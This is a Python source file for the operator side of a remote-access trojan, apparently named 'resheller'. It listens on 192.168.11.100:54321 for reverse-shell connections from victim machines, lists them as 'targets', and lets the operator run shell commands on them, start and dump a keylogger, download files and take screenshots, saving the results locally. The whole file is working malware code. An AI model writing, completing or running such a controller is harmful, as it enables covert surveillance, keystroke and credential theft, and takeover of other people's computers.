#!/usr/bin/env python3
from base64 import b64decode
from json import dumps, loads
from os import path, makedirs
from pathlib import Path
from socket import socket, AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR
from threading import Thread
from time import strftime

from src.color import Color


# noinspection DuplicatedCode
class ThreadServer:

    def __init__(self):
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.ips = []
        self.targets = []
        self.clients = 0
        self.stop_threads = False
        self._dir = f"{str(Path.home())}/.resheller"
        self.count = 1
        self.make_dir()

    def keylogger_dump(self, target):
        log_file = f'keylog_{strftime("%Y.%m.%d-%H.%M.%S")}.txt'
        print(Color(f"\n[+] Dumped Logs to {self._dir}\n").green())
        with open(f"{self._dir}/{log_file}", 'w') as log:
            log.write(self.safe_recv(target))

    def download(self, command, target):
        prompt = f'\n[+] Downloaded "{command[9:]}" to {self._dir}\n'
        print(Color(prompt).green())
        with open(f"{self._dir}/{command[9:]}", 'wb') as file:
            file.write(b64decode(self.safe_recv(target)))

    def screenshot(self, target):
        screenshot = f"screenshot{self.count}"
        print(Color(f'\n[+] Saved "{screenshot}" to {self._dir}\n').green())
        with open(f"{self._dir}/{screenshot}", "wb") as shot:
            image = self.safe_recv(target)
            image_decoded = b64decode(image)
            if image_decoded[:3] == "[!]":
                print(image_decoded)
            else:
                shot.write(image_decoded)
                self.count += 1

    def make_dir(self):
        if not path.isdir(self._dir):
            makedirs(self._dir)

    @staticmethod
    def safe_recv(target):
        data = "".encode('utf-8')
        while True:
            try:
                data = data + target.recv(1024)
                return loads(data)
            except ValueError:
                continue

    @staticmethod
    def safe_send(data, target):
        json_data = dumps(data)
        target.send(json_data.encode('utf-8'))

    def shell(self, target, ip):
        print(Color("[+] Connection Established").bold_green())
        print()
        while True:
            command = self.ps1(shell=True)
            if command == 'ls':
                command = 'dir'
            self.safe_send(command, target)
            if command == 'quit':
                break
            elif command == "exit":
                target.close()
                self.targets.remove(target)
                self.ips.remove(ip)
                break
            elif command[:2] == 'cd' and len(command) > 1:
                continue
            elif command[:15] == 'keylogger start':
                print(Color("[+] Started Keylogger").bold_green())
                continue
            elif command[:14] == "keylogger dump":
                self.keylogger_dump(target)
            elif command[:8] == "download":
                self.download(command, target)
            elif command[:10] == "screenshot":
                self.screenshot(target)
            else:
                print(self.safe_recv(target))

    def sock_object(self):
        self.sock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
        self.sock.bind(("192.168.11.100", 54321))
        self.sock.listen(5)

    @staticmethod
    def ps1(shell=False):
        if shell:
            shell = Color("Shell").bold_blue()
            arrow = Color(">>>").green()
            ip = Color("TARGET").bold_red()
            return input(f"{shell}[{ip}]{arrow} ")
        else:
            resheller = Color('CONTROLCENTRE').bold_green()
            thing = "{[<>]}"
            thing_color = Color(thing).bold_blue()
            tab = (int(len(thing) / 2) * " ")
            return input(f"{thing_color}{tab}{resheller}{tab}{thing_color}\n"
                         f"{thing_color} ")

    def thread(self):
        t1 = Thread(target=self.server)
        t1.start()
        count = 0
        while True:
            command = self.ps1()
            if ((command == "targets" or "session" in command)
                    and (not self.targets or not self.ips)):
                print(Color("\n[!] No Targets Found.").bold_red())
                print(Color("[*] Is a Reverse Shell Running?\n").yellow())
                continue
            if command == "targets":
                count = 1
                for ip in self.ips:
                    prompt = f"Session {str(count)}. <---> {str(ip)}"
                    print(Color(prompt).green())
                    count += 1
            elif command[:7] == "session":
                try:
                    num = int(command[8:])
                    num -= 1
                    tar_num = self.targets[num]
                    tar_ip = self.ips[num]
                    self.shell(tar_num, tar_ip)
                except (IndexError, ValueError):
                    prompt = "\n[!] No Session Matches That Selection\n"
                    print(Color(prompt).bold_red())
            elif command == "exit":
                for target in self.targets:
                    target.close()
                self.sock.close()
                self.stop_threads = True
            else:
                usage = ("\n[*] Usage:\n\n"
                         "target              --> view available targets\n"
                         "session <number>    --> select target by index\n")
                print(Color(usage).yellow())
                count += 1

    def server(self):
        while True:
            if self.stop_threads:
                break
            self.sock.settimeout(1)
            try:
                target, ip = self.sock.accept()
                self.targets.append(target)
                self.ips.append(ip)
                connect = (f"{self.targets[self.clients]} --- "
                           f"{self.ips[self.clients]} Connected!")
                print(Color(connect).bold_green())
                self.clients += 1
            except OSError:
                pass
